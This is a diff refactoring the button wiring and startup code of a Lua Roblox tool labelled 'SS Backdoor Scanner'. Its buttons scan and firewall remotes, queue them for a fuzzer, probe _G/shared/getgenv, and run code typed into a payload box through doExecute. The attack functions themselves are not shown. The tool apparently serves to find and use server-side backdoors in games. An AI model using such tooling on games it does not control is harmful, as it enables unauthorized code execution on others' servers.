     ProgressLabel.Text="Ready — click Deep Scan to begin."
     log("SYS","Results cleared.")
 end)
 bFWAll.MouseButton1Click:Connect(function()
-    local n=0; for _,e in ipairs(S.remotes) do if e.risk>=50 then firewallRemote(e); n+=1 end end
+    local n=0
+    for _, e in ipairs(S.remotes) do if e.risk>=50 then firewallRemote(e); n+=1 end end
     log("OK","Firewalled "..n.." high-risk remotes.")
 end)
-bAddFuzz.MouseButton1Click:Connect(function()
+bToFuzzer.MouseButton1Click:Connect(function()
     local added=0
-    for _,e in ipairs(S.remotes) do
+    for _, e in ipairs(S.remotes) do
         if e.risk>=50 then
-            local exists=false; for _,q in ipairs(S.fuzzQueue) do if q.path==e.path then exists=true; break end end
+            local exists=false
+            for _, q in ipairs(S.fuzzQueue) do if q.path==e.path then exists=true; break end end
             if not exists then
                 S.fuzzQueue[#S.fuzzQueue+1]=e; added+=1
-                local qr=Instance.new("Frame"); qr.Size=UDim2.new(1,-8,0,22); qr.BackgroundColor3=Color3.fromRGB(18,12,28); qr.BorderSizePixel=0; qr.Parent=FuzzQueueList; corner(qr,3); stroke(qr,T.PRP,1)
-                local ql=lbl(qr,e.path,11,T.PRP,Enum.Font.Code); ql.Size=UDim2.new(1,-30,1,0); ql.Position=UDim2.new(0,4,0,0)
-                local qb=btn(qr,"✕",T.BG3,T.CRIT,UDim2.new(0,22,0,18)); qb.Position=UDim2.new(1,-24,0.5,-9); qb.TextSize=9
-                local ep=e.path; qb.MouseButton1Click:Connect(function() for i,q in ipairs(S.fuzzQueue) do if q.path==ep then table.remove(S.fuzzQueue,i); break end end; qr:Destroy() end)
+                local qr=Instance.new("Frame"); qr.Size=UDim2.new(1,-8,0,22); qr.BackgroundColor3=Color3.fromRGB(18,12,28); qr.BorderSizePixel=0; qr.Parent=FuzzQueueList; mkCorner(qr,3); mkStroke(qr,T.PRP,1)
+                local ql=mkLbl(qr,e.path,11,T.PRP,Enum.Font.Code); ql.Size=UDim2.new(1,-30,1,0); ql.Position=UDim2.new(0,4,0,0)
+                local ep=e.path
+                local qb=mkBtn(qr,"✕",T.BG3,T.CRIT,UDim2.new(0,22,0,18)); qb.Position=UDim2.new(1,-24,0.5,-9); qb.TextSize=9
+                qb.MouseButton1Click:Connect(function()
+                    for i,q in ipairs(S.fuzzQueue) do if q.path==ep then table.remove(S.fuzzQueue,i); break end end
+                    qr:Destroy()
+                end)
             end
         end
     end
-    log("SYS","Added "..added.." high-risk remotes to fuzz queue."); switchTab("Fuzzer")
+    log("SYS","Added "..added.." high-risk remotes to fuzz queue.")
+    switchTab("Fuzzer")
 end)
 
-bFuzzAll.MouseButton1Click:Connect(function() task.spawn(runFuzzer) end)
-bFuzzStop.MouseButton1Click:Connect(function() S.isFuzzing=false; log("SYS","Fuzzer stopped.") end)
-bFuzzClear.MouseButton1Click:Connect(function() S.fuzzQueue={}; FuzzQueueList:ClearAllChildren(); ll(FuzzQueueList,2); log("SYS","Fuzz queue cleared.") end)
-bFuzzGBridge.MouseButton1Click:Connect(function() task.spawn(probeGBridge) end)
+bFuzzAll.MouseButton1Click:Connect(function()   task.spawn(runFuzzer) end)
+bFuzzStop.MouseButton1Click:Connect(function()  S.isFuzzing=false; log("SYS","Fuzzer stopped.") end)
+bFuzzClear.MouseButton1Click:Connect(function()
+    S.fuzzQueue={}; FuzzQueueList:ClearAllChildren(); mkList(FuzzQueueList,2)
+    log("SYS","Fuzz queue cleared.")
+end)
+bGBridge.MouseButton1Click:Connect(function() task.spawn(probeGBridge) end)
 
-bExec.MouseButton1Click:Connect(function() doExecute() end)
-bTest.MouseButton1Click:Connect(function() PayloadBox.Text='print("[SS] test fire @ "..tostring(tick()))'; doExecute() end)
-bClrPay.MouseButton1Click:Connect(function() PayloadBox.Text=""; ExecResultLabel.Text="Last: —"; ExecResultLabel.TextColor3=T.TXM end)
+bExec.MouseButton1Click:Connect(function()  doExecute() end)
+bTestF.MouseButton1Click:Connect(function()
+    PayloadBox.Text = 'print("[SS] test fire @ "..tostring(tick()))'
+    doExecute()
+end)
+bClrP.MouseButton1Click:Connect(function()
+    PayloadBox.Text = ""; ExecResultLabel.Text="Last: —"; ExecResultLabel.TextColor3=T.TXM
+end)
 
-bFWAS.MouseButton1Click:Connect(function() local n=0; for _,e in ipairs(S.remotes) do if e.risk>=50 then firewallRemote(e); n+=1 end end; log("OK","Firewalled "..n.." remotes.") end)
-bFWRes.MouseButton1Click:Connect(function() log("WARN","Restore not possible — remotes set to Parent=nil. Re-scan to rediscover.") end)
-bFWClr.MouseButton1Click:Connect(function() FWList:ClearAllChildren(); ll(FWList,3); S.firewalled={}; log("SYS","Firewall log cleared.") end)
+bFWAS.MouseButton1Click:Connect(function()
+    local n=0
+    for _, e in ipairs(S.remotes) do if e.risk>=50 then firewallRemote(e); n+=1 end end
+    log("OK","Firewalled "..n.." remotes.")
+end)
+bFWClr.MouseButton1Click:Connect(function()
+    FWList:ClearAllChildren(); mkList(FWList,3)
+    S.firewalled={}; log("SYS","Firewall log cleared.")
+end)
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §25  STARTUP  +  OPEN ANIMATION
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
 switchTab("Scanner")
 
-Win.Size=UDim2.new(0,0,0,0); Win.Position=UDim2.new(0.5,0,0.5,0)
-TweenService:Create(Win, TweenInfo.new(0.4,Enum.EasingStyle.Back,Enum.EasingDirection.Out), {
-    Size=UDim2.new(0,800,0,540), Position=UDim2.new(0.5,-400,0.5,-270)
+Win.Size = UDim2.new(0,0,0,0)
+Win.Position = UDim2.new(0.5,0,0.5,0)
+TweenService:Create(Win, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    Size     = UDim2.new(0,820,0,550),
+    Position = UDim2.new(0.5,-410,0.5,-275),
 }):Play()
 
 task.delay(0.45, function()
     startMonitor()
-    log("SYS","SS Backdoor Scanner v"..CFG.VERSION.." ready.")
+    log("SYS", "SS Backdoor Scanner v"..CFG.VERSION.." ready.")
     log("INFO","Click  ⚡ Deep Scan  to begin. Live monitor is active.")
-    log("INFO","Use 🤖 Fuzzer tab to auto-test all remotes. Use 🕵 G-Bridge probe to check _G/shared.")
+    log("INFO","Use 🤖 Fuzzer tab to auto-probe all remotes. Use 🕵 G-Bridge to check _G/shared/getgenv.")
 end)
